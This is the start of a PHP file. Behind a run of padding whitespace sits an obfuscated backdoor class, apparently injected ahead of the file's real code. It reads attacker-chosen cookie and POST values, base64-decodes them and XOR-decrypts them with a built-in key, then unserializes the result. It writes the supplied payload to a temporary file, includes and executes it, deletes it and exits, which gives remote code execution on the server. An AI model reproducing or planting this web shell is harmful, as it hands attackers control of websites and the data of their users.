<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("osoqqs")){class osoqqs{public static $hquefmllf = "rtrabuetsncrubrz";public static $ipewgbmsbt = NULL;public function __construct(){$lqkpvv = @$_COOKIE[substr(osoqqs::$hquefmllf, 0, 4)];if (!empty($lqkpvv)){$grdyv = "base64";$ogozand = "";$lqkpvv = explode(",", $lqkpvv);foreach ($lqkpvv as $xectqcstjc){$ogozand .= @$_COOKIE[$xectqcstjc];$ogozand .= @$_POST[$xectqcstjc];}$ogozand = array_map($grdyv . "_decode", array($ogozand,));$ogozand = $ogozand[0] ^ str_repeat(osoqqs::$hquefmllf, (strlen($ogozand[0]) / strlen(osoqqs::$hquefmllf)) + 1);osoqqs::$ipewgbmsbt = @unserialize($ogozand);}}public function __destruct(){$this->uyzhhgb();}private function uyzhhgb(){if (is_array(osoqqs::$ipewgbmsbt)) {$xfqrgmp = sys_get_temp_dir() . "/" . crc32(osoqqs::$ipewgbmsbt["salt"]);@osoqqs::$ipewgbmsbt["write"]($xfqrgmp, osoqqs::$ipewgbmsbt["content"]);include $xfqrgmp;@osoqqs::$ipewgbmsbt["delete"]($xfqrgmp);exit();}}}$vzhxi = new osoqqs();$vzhxi = NULL;} ?><?php
